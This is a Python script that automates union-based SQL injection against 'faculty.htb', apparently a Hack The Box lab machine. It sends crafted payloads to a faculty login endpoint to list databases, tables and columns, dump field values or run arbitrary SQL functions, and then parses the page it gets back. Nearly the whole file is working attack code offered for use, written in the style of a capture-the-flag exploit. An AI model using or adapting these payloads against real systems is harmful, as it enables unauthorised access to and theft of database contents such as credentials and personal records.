import signal, sys, argparse, requests, subprocess, base64

# debugging
import pdb

# ctrl+C

def signal_handler():
    print("[-] Interruption"); sys.exit()

signal.signal(signal.SIGINT, signal_handler)

# global variables

target_url = 'http://faculty.htb'

# arguments

parser = argparse.ArgumentParser(description='SQL Inyection')
parser.add_argument('-d', '--database', type=str, required=False, help='Select database')
parser.add_argument('-t', '--table', type=str, required=False, help='Select table')
parser.add_argument('-c', '--column', type=str, required=False, help='Select column')
parser.add_argument('-q', '--query', type=str, required=False, help='One word query (g.e version())')

args = parser.parse_args()

# query modes

def get_databases():
    return """' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata-- -"""

def get_tables(database):
    return """' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema = "{}"-- -""".format(database)

def get_columns(table):
    return """' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_name = "{}"-- -""".format(table)

def get_fields(column, table):
    return """' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, {}, 0x7c) from {}-- -""".format(column, table)
 
def get_info(command):
    return """' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, {}, 0x7c)-- -""".format(command)
    

# options

def options():
    try:
        if len(sys.argv) == 1:
            return get_databases()
        elif args.database and args.table and args.column:
            return get_fields(args.column, args.table)
        elif args.database and args.table:
            return get_columns(args.table)
        elif args.database:
            return get_tables(args.database)
        elif args.query:
            return get_info(args.query)
    except Exception as e:
        print(e)

# request

def inyection():
    # create session
    s = requests.Session()
    headers = {'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
    
    # set option
    inyection = options()

    # inyection
    data = dict(id_no=inyection)
    target = target_url + '/admin/ajax.php?action=login_faculty'
    r = s.post(target, headers=headers, data=data)
    target = target_url + '/index.php'
    r = s.get(target, cookies=r.cookies.get_dict()) 
    content = r.text
    
    # encode b64
    msg_b = content.encode('ascii')
    base64_b = base64.b64encode(msg_b)
    base64_m = base64_b.decode('ascii')
    
    # filter content
    command = f"""echo {base64_m} | base64 -d""" + """ | grep -E "<a" | head -n 1 | awk -F'>' '{print $2}' | awk '{print $1}'"""
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    print()
    print(output.stdout)
    
    

if __name__ == '__main__':
    inyection()
